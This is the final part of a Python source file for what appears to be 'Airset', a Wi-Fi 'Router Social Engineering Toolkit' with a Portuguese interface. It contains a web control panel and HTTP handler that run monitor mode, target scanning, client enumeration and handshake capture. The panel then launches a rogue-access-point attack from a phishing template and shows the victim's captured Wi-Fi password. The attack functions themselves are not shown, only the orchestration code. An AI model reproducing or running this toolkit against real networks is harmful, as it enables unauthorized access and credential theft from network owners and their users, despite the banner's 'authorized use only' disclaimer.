  </div>
</div>
</div><script>
const TOK="__CSRF__"; let SEL=null,FILTER="",LAST=null;
function applyFilter(v){FILTER=(v||"").toLowerCase();if(LAST)renderTargets(LAST.targets)}
function renderTargets(list){const tb=document.getElementById("targets");tb.innerHTML="";
  list.filter(t=>t.essid.toLowerCase().includes(FILTER)).forEach(t=>{const tr=document.createElement("tr");if(SEL===t.bssid)tr.className="sel";
    tr.innerHTML=`<td>${t.essid}</td><td>${t.bssid}</td><td>${t.channel}</td><td>${t.power}</td><td>${t.enc}</td>`;
    tr.onclick=()=>{SEL=t.bssid;api("/api/target","POST",{bssid:t.bssid});load()};tb.appendChild(tr)})}
async function api(p,m,b){const o={headers:{}};if(m&&m!=="GET"){o.method=m;o.headers["X-Airset-Token"]=TOK;o.headers["Content-Type"]="application/json";if(b)o.body=JSON.stringify(b)}const r=await fetch(p,o);return r.json()}
async function act(a,b){await api("/api/"+a,"POST",b);load()}
function startMon(){act("monitor",{iface:document.getElementById("iface").value})}
function scan(){act("scan",{seconds:+document.getElementById("scanSecs").value})}
function attack(){act("attack",{ap_iface:document.getElementById("apIface").value,template:document.getElementById("tpl").value})}
function opt(sel,list,keep){const cur=keep&&sel.value;sel.innerHTML="";list.forEach(v=>{const o=document.createElement("option");o.value=v;o.textContent=v;sel.appendChild(o)});if(cur)sel.value=cur}
const STEPS=["idle","monitor","scanning","scanned","capturing","captured","attacking"];
async function load(){const s=await api("/api/state");
 document.getElementById("phase").textContent=s.phase;
 document.querySelector("#conn .dot").className="dot"+(s.phase!=="idle"?" on":"");
 const st=document.getElementById("steps");st.innerHTML="";STEPS.forEach(x=>{const e=document.createElement("span");e.className="step"+(x===s.phase?" on":"");e.textContent=x;st.appendChild(e)});
 opt(document.getElementById("iface"),s.interfaces,true);
 opt(document.getElementById("apIface"),s.interfaces,true);
 opt(document.getElementById("tpl"),s.templates,true);
 document.getElementById("monInfo").textContent=s.monitor?("monitor: "+s.monitor):"";
 LAST=s;renderTargets(s.targets);
 if(s.target){SEL=s.target.bssid;document.getElementById("tgtBox").innerHTML=`Alvo: <b style="color:var(--cyan)">${s.target.essid}</b> · ${s.target.bssid} · ch ${s.target.channel}`}
 const ct=document.getElementById("clientsTbl");ct.innerHTML="";
 (s.target_clients||[]).forEach(c=>{const tr=document.createElement("tr");tr.innerHTML=`<td>${c.mac}</td><td>${c.power}</td><td>${c.packets}</td>`;ct.appendChild(tr)});
 const cliBtn=document.getElementById("cliBtn");cliBtn.disabled=!s.target||s.scanning_clients;
 document.getElementById("cliInfo").textContent=!s.target?"Selecione um alvo para listar os dispositivos conectados.":(s.scanning_clients?"Procurando clientes...":`${(s.target_clients||[]).length} cliente(s) conectado(s)`);
 document.getElementById("hsInfo").textContent=s.handshake?("handshake: "+s.handshake):"Selecione um alvo e capture.";
 document.getElementById("clients").textContent=s.clients;
 document.getElementById("attempts").textContent=s.attempts;
 document.getElementById("hsBadge").textContent=s.handshake?"OK":"—";
 document.getElementById("apBadge").textContent=s.phase==="attacking"?"ON":"off";
 const pb=document.getElementById("pwBox");if(s.password){pb.hidden=false;document.getElementById("pw").textContent=s.password}else pb.hidden=true;
 document.getElementById("log").textContent=s.log.join("\n");document.getElementById("log").scrollTop=1e9;
}
load();setInterval(load,2000);
</script></body></html>"""


class Handler(BaseHTTPRequestHandler):
    server_version = "AirsetWeb/1.0"
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype="application/json"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body)
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _snapshot(self):
        with _LOCK:
            s = dict(STATE)
        s["interfaces"] = list_wifi_interfaces()
        s["templates"] = available_templates()
        return s

    def do_GET(self):
        path = self.path.split("?")[0]
        if path == "/":
            return self._send(200, PAGE.replace("__CSRF__", CSRF_TOKEN), "text/html; charset=utf-8")
        if path == "/api/state":
            return self._send(200, self._snapshot())
        return self._send(404, {"error": "not found"})

    def _body(self):
        try:
            n = int(self.headers.get("Content-Length", 0))
            return json.loads(self.rfile.read(n) or b"{}")
        except (ValueError, json.JSONDecodeError):
            return {}

    def do_POST(self):
        if self.headers.get("X-Airset-Token") != CSRF_TOKEN:
            return self._send(403, {"error": "forbidden"})
        path = self.path.split("?")[0]
        b = self._body()
        if path == "/api/monitor":
            iface = b.get("iface")
            with _LOCK:
                STATE["iface"] = iface
            def _m():
                mon = start_monitor(iface)
                with _LOCK:
                    STATE["monitor"] = mon
                    STATE["phase"] = "monitor" if mon else "idle"
                log(f"monitor: {mon}" if mon else "! falha ao habilitar monitor")
            bg(_m)
        elif path == "/api/scan":
            bg(do_scan, int(b.get("seconds", 12)))
        elif path == "/api/monitor_stop":
            bg(stop_monitor_web)
        elif path == "/api/target":
            with _LOCK:
                STATE["target"] = next((t for t in STATE["targets"] if t["bssid"] == b.get("bssid")), None)
                STATE["target_clients"] = []
            if STATE["target"]:
                bg(do_scan_clients, int(b.get("client_secs", 10)))
        elif path == "/api/clients":
            bg(do_scan_clients, int(b.get("seconds", 10)))
        elif path == "/api/capture":
            bg(do_capture)
        elif path == "/api/capture_stop":
            bg(stop_capture)
        elif path == "/api/attack":
            bg(start_attack, b.get("ap_iface") or STATE["iface"], b.get("template"))
        elif path == "/api/attack_stop":
            bg(stop_attack)
        elif path == "/api/cleanup":
            bg(full_cleanup)
        else:
            return self._send(404, {"error": "not found"})
        return self._send(200, {"ok": True})


def _banner(url):
    art = r"""
     )))       _    ___ ___ ___ ___ _____
    )))))     /_\  |_ _| _ \ __| __|_   _|
   ((((( o    / _ \  | ||   / _|| _|  | |
    (((((    /_/ \_\|___|_|_\___|___| |_|
      '""".rstrip("\n")
    print(_c("red", art))
    print("        " + _c("gry", "Router Social Engineering Toolkit"))
    print("  " + _c("wht", "Painel") + "  " + _c("cyn", url))
    print("  " + _c("yel", "⚠  Uso autorizado apenas. Ctrl+C encerra e limpa.\n"))


def main():
    ap = argparse.ArgumentParser(description="Airset web control panel (stdlib).")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8092)
    args = ap.parse_args()

    if os.geteuid() != 0:
        print("Este painel precisa de root (monitor mode, hostapd, iptables). Use sudo.")
        sys.exit(1)

    DUMP_PATH.mkdir(parents=True, exist_ok=True)

    def shutdown(*_):
        print("\n[" + _c("yel", "!") + "] " + _c("yel", "Encerrando — limpando..."))
        full_cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    try:
        signal.signal(signal.SIGTERM, shutdown)
    except (ValueError, AttributeError):
        pass

    srv = ThreadingHTTPServer((args.host, args.port), Handler)
    _banner(f"http://{args.host}:{args.port}")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        shutdown()
    finally:
        srv.server_close()


if __name__ == "__main__":
    main()
